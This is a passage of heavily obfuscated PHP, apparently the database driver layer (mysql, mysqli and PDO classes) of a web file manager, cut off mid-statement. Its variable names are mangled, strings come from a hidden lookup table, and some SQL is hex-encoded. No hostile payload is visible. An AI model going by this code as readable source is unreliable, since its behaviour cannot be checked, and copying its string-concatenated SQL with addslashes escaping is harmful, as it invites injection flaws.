$this->parseValue($‡ŸÊ´ÏÈ); if (is_scalar($Ø—¸Äƒà)) { $“ß„õÚ•[] = $Ø—¸Äƒà; $¹ÏÜŠß’[] = $this->parseKey($î’ñ‘½ù); } } $æÆˆ»Ó = $¾µãéå„[893] . $this->parseTable($×Š©úÄ[$¾µãéå„[288]]) . $¾µãéå„[894] . implode($¾µãéå„[50], $¹ÏÜŠß’) . $¾µãéå„[895] . implode($¾µãéå„[50], $“ß„õÚ•) . $¾µãéå„[896]; return $this->execute($æÆˆ»Ó); } public function insertAll($™†íÀ‘, $“µ¤ø– = array(), $ù²ğí­· = false) { $Ê‘ÙÅÃÚ =& $_SERVER[ĞÆÏ¡Îª]; if (!is_array($™†íÀ‘[0])) { return !1; } $…Ğ®†Šî = array_keys($™†íÀ‘[0]); $“‰ÖèİÒ = array(); foreach ($™†íÀ‘ as $¼ÛİÀÒ) { $›ê¾ÆØÉ = array(); foreach ($¼ÛİÀÒ as $¤şØÕÂ“ => $È‹öº) { $È‹öº = $this->parseValue($È‹öº); if (is_scalar($È‹öº)) { $›ê¾ÆØÉ[] = $È‹öº; } } $“‰ÖèİÒ[] = $Ê‘ÙÅÃÚ[269] . implode($Ê‘ÙÅÃÚ[50], $›ê¾ÆØÉ) . $Ê‘ÙÅÃÚ[896]; } array_walk($…Ğ®†Šî, array($this, $Ê‘ÙÅÃÚ[897])); $›Î¬è†Û = ($ù²ğí­· ? $Ê‘ÙÅÃÚ[898] : $Ê‘ÙÅÃÚ[899]) . $Ê‘ÙÅÃÚ[900] . $this->parseTable($“µ¤ø–[$Ê‘ÙÅÃÚ[288]]) . $Ê‘ÙÅÃÚ[894] . implode($Ê‘ÙÅÃÚ[50], $…Ğ®†Šî) . $Ê‘ÙÅÃÚ[901] . implode($Ê‘ÙÅÃÚ[50], $“‰ÖèİÒ); return $this->execute($›Î¬è†Û); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ü¸¡¾äĞ =& $_SERVER[ĞÆÏ¡Îª]; $this->error = mysql_errno() . $Ü¸¡¾äĞ[4] . mysql_error($this->_linkID); if ($Ü¸¡¾äĞ[12] != $this->queryStr) { $this->error .= LNG($Ü¸¡¾äĞ[48]) . $this->queryStr; } think_trace($this->error, $Ü¸¡¾äĞ[12], $Ü¸¡¾äĞ[49]); return $this->error; } public function escapeString($«Ö¶»—ã) { if ($this->_linkID) { return mysql_real_escape_string($«Ö¶»—ã, $this->_linkID); } else { return mysql_escape_string($«Ö¶»—ã); } } public function parseKey(&$ÁÒæâœ¦, $÷ø²‰¿½ = true) { $’„ßÒ§í =& $_SERVER[ĞÆÏ¡Îª]; if ($÷ø²‰¿½) { $ÁÒæâœ¦ = $this->parseKeyCheck($ÁÒæâœ¦); } if ($ÁÒæâœ¦ != $’„ßÒ§í[188] && !preg_match($’„ßÒ§í[902], $ÁÒæâœ¦)) { $ÁÒæâœ¦ = $’„ßÒ§í[393] . trim($ÁÒæâœ¦, $’„ßÒ§í[393]) . $’„ßÒ§í[393]; } return $ÁÒæâœ¦; } } class DbMysqli extends Db { public function __construct($­ÉĞ„ñŒ = '') { $ø¬ã”Ï› =& $_SERVER[ĞÆÏ¡Îª]; if (!extension_loaded($ø¬ã”Ï›[903])) { think_exception(think_lang($ø¬ã”Ï›[14]) . $ø¬ã”Ï›[904]); } if (!empty($­ÉĞ„ñŒ)) { $this->config = $­ÉĞ„ñŒ; if (empty($this->config[$ø¬ã”Ï›[17]])) { $this->config[$ø¬ã”Ï›[17]] = $ø¬ã”Ï›[12]; } } } public function connect($”ÁÊ¬ş‰ = '', $½†Å™° = 0) { $ĞŞ‰Ÿ†õ =& $_SERVER[ĞÆÏ¡Îª]; if (!isset($this->linkID[$½†Å™°])) { if (empty($”ÁÊ¬ş‰)) { $”ÁÊ¬ş‰ = $this->config; } $this->linkID[$½†Å™°] = new mysqli($”ÁÊ¬ş‰[$ĞŞ‰Ÿ†õ[877]], $”ÁÊ¬ş‰[$ĞŞ‰Ÿ†õ[879]], $”ÁÊ¬ş‰[$ĞŞ‰Ÿ†õ[880]], $”ÁÊ¬ş‰[$ĞŞ‰Ÿ†õ[21]], $”ÁÊ¬ş‰[$ĞŞ‰Ÿ†õ[878]] ? intval($”ÁÊ¬ş‰[$ĞŞ‰Ÿ†õ[878]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ô¤é•ø¯ = $this->linkID[$½†Å™°]->server_version; $this->linkID[$½†Å™°]->query($ĞŞ‰Ÿ†õ[881] . think_config($ĞŞ‰Ÿ†õ[882]) . $ĞŞ‰Ÿ†õ[58]); if ($ô¤é•ø¯ > $ĞŞ‰Ÿ†õ[883]) { $this->linkID[$½†Å™°]->query($ĞŞ‰Ÿ†õ[884]); } $this->connected = !0; if (1 != think_config($ĞŞ‰Ÿ†õ[22])) { unset($this->config); } } return $this->linkID[$½†Å™°]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($©É¶Æû´) { $ÆÓò­†à =& $_SERVER[ĞÆÏ¡Îª]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $©É¶Æû´; if ($this->queryID) { $this->free(); } think_action_status($ÆÓò­†à[23], 1); think_status($ÆÓò­†à[24]); $this->queryID = $this->_linkID->query($©É¶Æû´); if ($this->_linkID->more_results()) { while (($’€şğ’“ = $this->_linkID->next_result()) != NULL) { $’€şğ’“->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($’„Ãüâ÷) { $€ü†£º÷ =& $_SERVER[ĞÆÏ¡Îª]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $’„Ãüâ÷; if ($this->queryID) { $this->free(); } think_action_status($€ü†£º÷[25], 1); think_status($€ü†£º÷[24]); $Ğµ—úÓ = $this->_linkID->query($’„Ãüâ÷); $this->debug(); if (!1 === $Ğµ—úÓ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $È´ßÍ†» = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$È´ßÍ†») { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $äÃÈ§Ÿğ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$äÃÈ§Ÿğ) { $this->error(); return !1; } } return !0; } private function getAll() { $Õˆ®’É = array(); if ($this->numRows > 0) { for ($ş¡Óëª = 0; $ş¡Óëª < $this->numRows; $ş¡Óëª++) { $Õˆ®’É[$ş¡Óëª] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Õˆ®’É; } public function getFields($ˆíğ°Ô¸) { $¬—¢›œ =& $_SERVER[ĞÆÏ¡Îª]; $²Õ¥¶€¥ = $this->query($¬—¢›œ[888] . $this->parseKey($ˆíğ°Ô¸)); $Ùéô×€¿ = array(); if ($²Õ¥¶€¥) { foreach ($²Õ¥¶€¥ as $òï’ş£• => $²ëÏ®„ã) { $Ùéô×€¿[$²ëÏ®„ã[$¬—¢›œ[31]]] = array($¬—¢›œ[32] => $²ëÏ®„ã[$¬—¢›œ[31]], $¬—¢›œ[33] => $²ëÏ®„ã[$¬—¢›œ[34]], $¬—¢›œ[35] => (bool) ($²ëÏ®„ã[$¬—¢›œ[36]] === $¬—¢›œ[12]), $¬—¢›œ[37] => $²ëÏ®„ã[$¬—¢›œ[38]], $¬—¢›œ[39] => strtolower($²ëÏ®„ã[$¬—¢›œ[40]]) == $¬—¢›œ[41], $¬—¢›œ[42] => strtolower($²ëÏ®„ã[$¬—¢›œ[43]]) == $¬—¢›œ[44]); } } return $Ùéô×€¿; } public function getTables($µêéûåÒ = '') { $—šÕôè =& $_SERVER[ĞÆÏ¡Îª]; $İ ‡Ó˜‹ = !empty($µêéûåÒ) ? $—šÕôè[890] . $µêéûåÒ . $—šÕôè[891] : $—šÕôè[892]; $ò³¤´‹Ò = $this->query($İ ‡Ó˜‹); $¾÷ûÈ = array(); if ($ò³¤´‹Ò) { foreach ($ò³¤´‹Ò as $Œîèµ»¿ => $…†Í¨) { $¾÷ûÈ[$Œîèµ»¿] = current($…†Í¨); } } return $¾÷ûÈ; } public function replace($âé×¼Ëğ, $…¿ó±İÏ = array()) { $à…¼éĞ‡ =& $_SERVER[ĞÆÏ¡Îª]; foreach ($âé×¼Ëğ as $Ûº¡ÃÔ¡ => $»Óëœ¨Â) { $¨úÛÏ¹ú = $this->parseValue($»Óëœ¨Â); if (is_scalar($¨úÛÏ¹ú)) { $ø½ª°çø[] = $¨úÛÏ¹ú; $ôª·ùË[] = $this->parseKey($Ûº¡ÃÔ¡); } } $‚¬§º¶Ş = $à…¼éĞ‡[893] . $this->parseTable($…¿ó±İÏ[$à…¼éĞ‡[288]]) . $à…¼éĞ‡[894] . implode($à…¼éĞ‡[50], $ôª·ùË) . $à…¼éĞ‡[895] . implode($à…¼éĞ‡[50], $ø½ª°çø) . $à…¼éĞ‡[896]; return $this->execute($‚¬§º¶Ş); } public function insertAll($¤”İıÁ‰, $“†üá¯ğ = array(), $ñ‹È«„ = false) { $ŸõÒê =& $_SERVER[ĞÆÏ¡Îª]; if (!is_array($¤”İıÁ‰[0])) { return !1; } $©Š—ªÕ± = array_keys($¤”İıÁ‰[0]); $‹ñÛöëÌ = array(); foreach ($¤”İıÁ‰ as $÷ñ‹ƒÀ) { $Éâ’²˜Å = array(); foreach ($÷ñ‹ƒÀ as $ˆ‹·´Ûª => $¨ŸÉôêë) { $¨ŸÉôêë = $this->parseValue($¨ŸÉôêë); if (is_scalar($¨ŸÉôêë)) { $Éâ’²˜Å[] = $¨ŸÉôêë; } } $‹ñÛöëÌ[] = $ŸõÒê[269] . implode($ŸõÒê[50], $Éâ’²˜Å) . $ŸõÒê[896]; } array_walk($©Š—ªÕ±, array($this, $ŸõÒê[897])); $é·¶¢˜Ï = $ñ‹È«„ ? $ŸõÒê[898] : $ŸõÒê[899]; $í£ÅÅôÇ = $é·¶¢˜Ï . $ŸõÒê[900] . $this->parseTable($“†üá¯ğ[$ŸõÒê[288]]) . $ŸõÒê[894] . implode($ŸõÒê[50], $©Š—ªÕ±) . $ŸõÒê[901] . implode($ŸõÒê[50], $‹ñÛöëÌ); return $this->execute($í£ÅÅôÇ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Äîıøü¹ =& $_SERVER[ĞÆÏ¡Îª]; $this->error = $this->_linkID->errno . $Äîıøü¹[4] . $this->_linkID->error; if ($Äîıøü¹[12] != $this->queryStr) { $this->error .= LNG($Äîıøü¹[48]) . $this->queryStr; } think_trace($this->error, $Äîıøü¹[12], $Äîıøü¹[49]); return $this->error; } public function escapeString($À…ª„™÷) { if ($this->_linkID) { return $this->_linkID->real_escape_string($À…ª„™÷); } else { return addslashes($À…ª„™÷); } } public function parseKey(&$ú­­Ò…Ò, $’‚ÅËó™ = true) { $Ğ£›ìô =& $_SERVER[ĞÆÏ¡Îª]; if ($’‚ÅËó™) { $ú­­Ò…Ò = $this->parseKeyCheck($ú­­Ò…Ò); } if ($ú­­Ò…Ò != $Ğ£›ìô[188] && !preg_match($Ğ£›ìô[902], $ú­­Ò…Ò)) { $ú­­Ò…Ò = $Ğ£›ìô[393] . trim($ú­­Ò…Ò, $Ğ£›ìô[393]) . $Ğ£›ìô[393]; } return $ú­­Ò…Ò; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($‡‹ûÎ© = '') { $óÕì£²ï =& $_SERVER[ĞÆÏ¡Îª]; if (!class_exists($óÕì£²ï[905])) { think_exception(think_lang($óÕì£²ï[14]) . $óÕì£²ï[906]); } if (!empty($‡‹ûÎ©)) { $this->config = $‡‹ûÎ©; if (empty($this->config[$óÕì£²ï[17]])) { $this->config[$óÕì£²ï[17]] = array(); } } } public function connect($™¯ôáõ• = '', $š¿¹¾Ğö = 0) { $úÎ‚ÀĞ× =& $_SERVER[ĞÆÏ¡Îª]; if (!isset($this->linkID[$š¿¹¾Ğö])) { if (empty($™¯ôáõ•)) { $™¯ôáõ• = $this->config; } $Æ±ãÚ® = !empty($™¯ôáõ•[$úÎ‚ÀĞ×[17]][$úÎ‚ÀĞ×[18]]) ? $™¯ôáõ•[$úÎ‚ÀĞ×[17]][$úÎ‚ÀĞ×[18]] : $this->pconnect; if ($Æ±ãÚ®) { $™¯ôáõ•[$úÎ‚ÀĞ×[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$š¿¹¾Ğö] = new PDO($™¯ôáõ•[$úÎ‚ÀĞ×[907]], $™¯ôáõ•[$úÎ‚ÀĞ×[879]], $™¯ôáõ•[$úÎ‚ÀĞ×[880]], $™¯ôáõ•[$úÎ‚ÀĞ×[17]]); } catch (PDOException $Ø½ÇêñŒ) { think_exception($Ø½ÇêñŒ->getMessage()); } $this->dbType = $this->_getDsnType($™¯ôáõ•[$úÎ‚ÀĞ×[907]]); if (in_array($this->dbType, array($úÎ‚ÀĞ×[908], $úÎ‚ÀĞ×[909], $úÎ‚ÀĞ×[910], $úÎ‚ÀĞ×[911]))) { think_exception($úÎ‚ÀĞ×[912] . $this->dbType . $úÎ‚ÀĞ×[913] . $this->dbType . $úÎ‚ÀĞ×[914]); } if (!$this->linkID[$š¿¹¾Ğö]) { think_exception($úÎ‚ÀĞ×[915]); } try { $this->linkID[$š¿¹¾Ğö]->exec($úÎ‚ÀĞ×[916] . think_config($úÎ‚ÀĞ×[882])); } catch (Exception $Ø½ÇêñŒ) { } $this->connected = !0; if (1 != think_config($úÎ‚ÀĞ×[22])) { unset($this->config); } } return $this->linkID[$š¿¹¾Ğö]; } public function free() { $this->PDOStatement = null; } public function query($Œ”¤Ãœ•, $Ë ‡“Ãû = array()) { $ÓÖªå„à =& $_SERVER[ĞÆÏ¡Îª]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Œ”¤Ãœ•; if (!empty($Ë ‡“Ãû)) { $this->queryStr .= $ÓÖªå„à[917] . print_r($Ë ‡“Ãû, !0) . $ÓÖªå„à[918]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÓÖªå„à[23], 1); think_status($ÓÖªå„à[24]); $this->PDOStatement = $this->_linkID->prepare($Œ”¤Ãœ•); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ŠñÒ‚Ş = $this->PDOStatement->execute($Ë ‡“Ãû); $this->debug(); if (!1 === $ŠñÒ‚Ş) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($„±ïµÒø, $˜İù¹ïË = array()) { $’õõë€¢ =& $_SERVER[ĞÆÏ¡Îª]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $„±ïµÒø; if (!empty($˜İù¹ïË)) { $this->queryStr .= $’õõë€¢[917] . print_r($˜İù¹ïË, !0) . $’õõë€¢[918]; } $ÆŸÖ¶ğ± = !1; if ($this->dbType == $’õõë€¢[911]) { if (preg_match($’õõë€¢[919], $this->queryStr, $¾×ä¦€ß)) { $this->table = think_config($’õõë€¢[920]) . str_ireplace(think_config($’õõë€¢[921]), $’õõë€¢[246], $¾×ä¦€ß[2]); $ÆŸÖ¶ğ± = (bool) $this->query($’õõë€¢[922] . strtoupper($this->table) . $’õõë€¢[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($’õõë€¢[25], 1); think_status($’õõë€¢[24]); $this->PDOStatement = $this->_linkID->prepare($„±ïµÒø); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $‡Æšğ„À = $this->PDOStatement->execute($˜İù¹ïË); $this->debug(); if (!1 === $‡Æšğ„À) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ÆŸÖ¶ğ± || preg_match($’õõë€¢[923], $„±ïµÒø)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ğú‚ı Ô = $this->_linkID->commit(); $this->transTimes = 0; if (!$Ğú‚ı Ô) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ê«Ë…º’ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ê«Ë…º’) { $this->error(); return !1; } } return !0; } private function getAll() { $à†´¹Ô‘ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($à†´¹Ô‘); return $à†´¹Ô‘; } public function getFields($ĞÒ¾’Õé) { $İ´Şã„ƒ =& $_SERVER[ĞÆÏ¡Îª]; $this->initConnect(!0); if (think_config($İ´Şã„ƒ[924])) { $’Ÿ«î»û = str_replace($İ´Şã„ƒ[925], $ĞÒ¾’Õé, think_config($İ´Şã„ƒ[924])); } else { switch ($this->dbType) { case $İ´Şã„ƒ[908]: case $İ´Şã„ƒ[926]: $’Ÿ«î»û = "\123\105\x4c\105\x43\x54\40\x20\x20\143\157\x6c\165\155\x6e\137\156\x61\x6d\145\x20\x61\163\x20\47\x4e\141\155\145\47\54\x20\x20\40\144\141\x74\x61\x5f\164\171\x70\145\40\x61\163\40\x27\124\171\x70\x65\x27\x2c\x20\40\40\143\157\x6c\x75\155\156\137\x64\145\146\x61\x75\154\164\x20\141\163\x20\x27\104\145\146\141\x75\x6c\164\x27\x2c\x20\40\x20\x69\x73\137\156\165\x6c\154\x61\x62\x6c\145\40\141\x73\x20\x27\116\165\154\x6c\x27\xa\x9\x9\x46\x52\117\x4d\11\x69\x6e\146\x6f\x72\155\x61\164\x69\x6f\156\137\x73\x63\150\x65\155\x61\56\164\x61\x62\154\145\x73\x20\x41\x53\40\x74\xa\x9\11\x4a\x4f\111\x4e\11\151\x6e\x66\x6f\162\155\x61\x74\x69\157\156\137\163\x63\150\145\155\141\56\143\x6f\x6c\165\155\x6e\163\40\101\x53\x20\x63\xa\11\x9\117\x4e\40\40\x74\x2e\x74\141\x62\x6c\x65\x5f\143\141\x74\x61\x6c\x6f\147\40\x3d\40\143\x2e\x74\x61\x62\x6c\x65\x5f\143\x61\x74\x61\x6c\157\147\12\11\11\101\x4e\104\x20\x74\56\x74\141\142\x6c\x65\137\x73\143\150\x65\155\141\x20\75\40\x63\x2e\164\x61\142\154\x65\x5f\x73\143\x68\145\x6d\x61\xa\11\x9\x41\116\104\x20\164\56\164\x61\142\154\x65\137\x6e\x61\155\145\x20\75\x20\x63\56\x74\x61\x62\154\145\x5f\x6e\x61\155\x65\xa\x9\11\x57\x48\x45\x52\x45\40\x20\40\x74\x2e\164\x61\x62\154\x65\x5f\x6e\141\x6d\145\x20\75\x20\47{$ĞÒ¾’Õé}\x27"; break; case $İ´Şã„ƒ[927]: $’Ÿ«î»û = $İ´Şã„ƒ[928] . $ĞÒ¾’Õé . $İ´Şã„ƒ[929]; break; case $İ´Şã„ƒ[909]: case $İ´Şã„ƒ[911]: $’Ÿ«î»û = $İ´Şã„ƒ[930] . $İ´Şã„ƒ[931] . $İ´Şã„ƒ[932] . strtoupper($ĞÒ¾’Õé) . $İ´Şã„ƒ[933] . strtoupper($ĞÒ¾’Õé) . $İ´Şã„ƒ[934]; break; case $İ´Şã„ƒ[935]: $’Ÿ«î»û = $İ´Şã„ƒ[936] . $ĞÒ¾’Õé . $İ´Şã„ƒ[937]; break; case $İ´Şã„ƒ[910]: break; case $İ´Şã„ƒ[938]: default: $’Ÿ«î»û = $İ´Şã„ƒ[939] . ($this->dbType == $İ´Şã„ƒ[938] ? "\x60{$ĞÒ¾’Õé}\x60" : $ĞÒ¾’Õé); } } $Ø±Š†ò = $this->query($’Ÿ«î»û); $û¿ÖÎä¡ = array(); if ($Ø±Š†ò) { foreach ($Ø±Š†ò as $¬Í´ë•¬ => $×ìº¨ûŸ) { $×ìº¨ûŸ = array_change_key_case($×ìº¨ûŸ); $×ìº¨ûŸ[$İ´Şã„ƒ[32]] = isset($×ìº¨ûŸ[$İ´Şã„ƒ[32]]) ? $×ìº¨ûŸ[$İ´Şã„ƒ[32]] : $İ´Şã„ƒ[246]; $×ìº¨ûŸ[$İ´Şã„ƒ[33]] = isset($×ìº¨ûŸ[$İ´Şã„ƒ[33]]) ? $×ìº¨ûŸ[$İ´Şã„ƒ[33]] : $İ´Şã„ƒ[246]; $²®àâ·¯ = isset($×ìº¨ûŸ[$İ´Şã„ƒ[282]]) ? $×ìº¨ûŸ[$İ´Şã„ƒ[282]] : $×ìº¨ûŸ[$İ´Şã„ƒ[32]]; $û¿ÖÎä¡[$²®àâ·¯] = array($İ´Şã„ƒ[32] => $²®àâ·¯, $İ´Şã„ƒ[33] => $×ìº¨ûŸ[$İ´Şã„ƒ[33]], $İ´Şã„ƒ[35] => (bool) (isset($×ìº¨ûŸ[$İ´Şã„ƒ[103]]) && $×ìº¨ûŸ[$İ´Şã„ƒ[103]] === $İ´Şã„ƒ[12] || isset($×ìº¨ûŸ[$İ´Şã„ƒ[35]]) && $×ìº¨ûŸ[$İ´Şã„ƒ[35]] === $İ´Şã„ƒ[12]), $İ´Şã„ƒ[37] => isset($×ìº¨ûŸ[$İ´Şã„ƒ[37]]) ? $×ìº¨ûŸ[$İ´Şã„ƒ[37]] : (isset($×ìº¨ûŸ[$İ´Şã„ƒ[56]]) ? $×ìº¨ûŸ[$İ´Şã„ƒ[56]] : $İ´Şã„ƒ[246]), $İ´Şã„ƒ[39] => isset($×ìº¨ûŸ[$İ´Şã„ƒ[94]]) ? strtolower($×ìº¨ûŸ[$İ´Şã„ƒ[94]]) == $İ´Şã„ƒ[41] : (isset($×ìº¨ûŸ[$İ´Şã„ƒ[57]]) ? $×ìº¨ûŸ[$İ´Şã„ƒ[57]] : !1), $İ´Şã„ƒ[42] => isset($×ìº¨ûŸ[$İ´Şã„ƒ[940]]) ? strtolower($×ìº¨ûŸ[$İ´Şã„ƒ[940]]) == $İ´Şã„ƒ[44] : (isset($×ìº¨ûŸ[$İ´Şã„ƒ[94]]) ? $×ìº¨ûŸ[$İ´Şã„ƒ[94]] : !1)); } } return $û¿ÖÎä¡; } public function getTables($‘Ô Ç“Î = '') { $•«¿úË =& $_SERVER[ĞÆÏ¡Îª]; if (think_config($•«¿úË[941])) { $¿òî©âÓ = str_replace($•«¿úË[942], $‘Ô Ç“Î, think_config($•«¿úË[941])); } else { switch ($this->dbType) { case $•«¿úË[909]: case $•«¿úË[911]: $¿òî©âÓ = $•«¿úË[943]; break; case $•«¿úË[908]: case $•«¿úË[926]: $¿òî©âÓ = $•«¿úË[944]; break; case $•«¿úË[935]: $¿òî©âÓ = $•«¿úË[945]; break; case $•«¿úË[910]: think_exception(think_lang($•«¿úË[946]) . $•«¿úË[947]); break; case $•«¿úË[927]: $¿òî©âÓ = $•«¿úË[45] . $•«¿úË[46] . $•«¿úË[47]; break; case $•«¿úË[938]: default: if (!empty($‘Ô Ç“Î)) { $¿òî©âÓ = $•«¿úË[890] . $‘Ô Ç“Î . $•«¿úË[891]; } else { $¿òî©âÓ = $•«¿úË[892]; } } } $¹ç‰ä¶ = $this->query($¿òî©âÓ); $­Ğ…œã = array(); foreach ($¹ç‰ä¶ as $öôÖè¦ƒ => $ÑÇ¸³ş) { $­Ğ…œã[$öôÖè¦ƒ] = current($ÑÇ¸³ş); } return $­Ğ…œã; } protected function parseLimit($²«Ù¿×) { $ÂœÁÑé² =& $_SERVER[ĞÆÏ¡Îª]; $ÇàøŸé‡ = $ÂœÁÑé²[12]; if (!empty($²«Ù¿×)) { switch ($this->dbType) { case $ÂœÁÑé²[935]: case $ÂœÁÑé²[927]: $²«Ù¿× = explode($ÂœÁÑé²[50], $²«Ù¿×); if (count($²«Ù¿×) > 1) { $ÇàøŸé‡ .= $ÂœÁÑé²[51] . $²«Ù¿×[1] . $ÂœÁÑé²[52] . $²«Ù¿×[0] . $ÂœÁÑé²[53]; } else { $ÇàøŸé‡ .= $ÂœÁÑé²[51] . $²«Ù¿×[0] . $ÂœÁÑé²[53]; } break; case $ÂœÁÑé²[908]: case $ÂœÁÑé²[926]: break; case $ÂœÁÑé²[910]: break; case $ÂœÁÑé²[909]: case $ÂœÁÑé²[911]: break; case $ÂœÁÑé²[938]: default: $ÇàøŸé‡ .= $ÂœÁÑé²[51] . $²«Ù¿× . $ÂœÁÑé²[53]; } } return $ÇàøŸé‡; } public function parseKey(&$ÛÂ›ËÑ¾, $Ù„ß·ê = true) { $ÃÈ½Ô÷ò =& $_SERVER[ĞÆÏ¡Îª]; if ($Ù„ß·ê) { $ÛÂ›ËÑ¾ = $this->parseKeyCheck($ÛÂ›ËÑ¾); } if ($this->dbType == $ÃÈ½Ô÷ò[938]) { if ($ÛÂ›ËÑ¾ != $ÃÈ½Ô÷ò[188] && !preg_match($ÃÈ½Ô÷ò[902], $ÛÂ›ËÑ¾)) { $ÛÂ›ËÑ¾ = $ÃÈ½Ô÷ò[393] . trim($ÛÂ›ËÑ¾, $ÃÈ½Ô÷ò[393]) . $ÃÈ½Ô÷ò[393]; } return $ÛÂ›ËÑ¾; } else { return parent::parseKey($ÛÂ›ËÑ¾, $Ù„ß·ê); } } public function close() { $this->_linkID = null; } public function error() { $ÍíË³ˆ¾ =& $_SERVER[ĞÆÏ¡Îª]; if ($this->PDOStatement) { $åı«œ‹ì = $this->PDOStatement->errorInfo(); $this->error = $åı«œ‹ì[1] . $ÍíË³ˆ¾[4] . $åı«œ‹ì[2]; } else { $this->error = $ÍíË³ˆ¾[12]; } if ($ÍíË³ˆ¾[12] != $this->queryStr) { $this->error .= LNG($ÍíË³ˆ¾[48]) . $this->queryStr; } think_trace($this->error, $ÍíË³ˆ¾[12], $ÍíË³ˆ¾[49]); return $this->error; } public function escapeString($”şÁ) { $œ³¸³³¹ =& $_SERVER[ĞÆÏ¡Îª]; switch ($this->dbType) { case $œ³¸³³¹[935]: case $œ³¸³³¹[908]: case $œ³¸³³¹[926]: case $œ³¸³³¹[938]: return addslashes($”şÁ); case $œ³¸³³¹[910]: case $œ³¸³³¹[927]: case $œ³¸³³¹[909]: case $œ³¸³³¹[911]: return str_ireplace($œ³¸³³¹[58], $œ³¸³³¹[59], $”şÁ); } } protected function parseValue($Ê”—üÈñ) { $Ô…¬Ûº¼ =& $_SERVER[ĞÆÏ¡Îª]; if (is_string($Ê”—üÈñ)) { $Æşœí÷í = strpos($Ê”—üÈñ, $Ô…¬Ûº¼[4]) === 0 && in_array($Ê”—üÈñ, array_keys($this->bind)); $Ê”—üÈñ = $Æşœí÷í ? $this->escapeString($Ê”—üÈñ) : $Ô…¬Ûº¼[948] . $this->escapeString($Ê”—üÈñ) . $Ô…¬Ûº¼[948]; } elseif (isset($Ê”—üÈñ[0]) && is_string($Ê”—üÈñ[0]) && strtolower($Ê”—üÈñ[0]) == $Ô…¬Ûº¼[306]) { $Ê”—üÈñ = $this->escapeString($Ê”—üÈñ[1]); } elseif (is_array($Ê”—üÈñ)) { $Ê”—üÈñ = array_map(array($this, $Ô…¬Ûº¼[949]), $Ê”—üÈñ); } elseif (is_bool($Ê”—üÈñ)) { $Ê”—üÈñ = $Ê”—üÈñ ? $Ô…¬Ûº¼[88] : $Ô…¬Ûº¼[197]; } elseif (is_null($Ê”—üÈñ)) { $Ê”—üÈñ = $Ô…¬Ûº¼[103]; } return $Ê”—üÈñ; } public function getLastInsertId() { $‡ ôáÀ‰ =& $_SERVER[ĞÆÏ¡Îª]; switch ($this->dbType) { case $‡ ôáÀ‰[935]: case $‡ ôáÀ‰[927]: case $‡ ôáÀ‰[908]: case $‡ ôáÀ‰[926]: case $‡ ôáÀ‰[910]: case $‡ ôáÀ‰[938]: return $this->_linkID->lastInsertId(); case $‡ ôáÀ‰[909]: case $‡ ôáÀ‰[911]: $‰Œ½‚Ø = $this->table; $É…’Ã­£ = $this->query("\x53\105\x4c\x45\103\124\40{$‰Œ½‚Ø}\56\143\165\162\162\166\141\x6c\x20\143\165\x72\x72\166\141\154\40\106\122\117\x4d\x20\144\165\141\x6c"); return $É…’Ã­£ ? $É…’Ã­£[0][$‡ ôáÀ‰[950]] : 0; } } } goto DšäÚÀîÄÅ; F¢‡®‡£ñ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($‡ì„˜ª = false) { } public function exist($Æ„ëÔ¥Ä) { $ûîĞ– = $this->info($Æ„ëÔ¥Ä); return $ûîĞ–[$_SERVER[ĞÆÏ¡Îª][201]]; } public function isFile($¤àÜ»¸‡) { $ˆŠ®èØ÷ = $this->info($¤àÜ»¸‡); return $ˆŠ®èØ÷[$_SERVER[ĞÆÏ¡Îª][201]]; } public function isFolder($ÎçŸª) { return !1; } public function size($ÛÈıÑø) { $û¶˜Å× = $this->info($ÛÈıÑø); return $û¶˜Å×[$_SERVER[ĞÆÏ¡Îª][76]]; } public function info($Ğ¾ñ˜) { return $this->infoParse($Ğ¾ñ˜); } public function infoAuth($¥ÉˆÆİ) { return $this->infoParse($¥ÉˆÆİ); } public function infoWithChildren($Ü™±·ïô) { return $this->infoParse($Ü™±·ïô); } public function infoFull($ŒîÛŠ›à) { return $this->infoParse($ŒîÛŠ›à); } private function infoParse($ÛóèÅ¬Î) { $Âº¡Îêè =& $_SERVER[ĞÆÏ¡Îª]; $¹Öõëì€ = $this->header($ÛóèÅ¬Î); if (!$¹Öõëì€ || !$¹Öõëì€[$Âº¡Îêè[745]]) { return !1; } $¢‹¤®–ß = 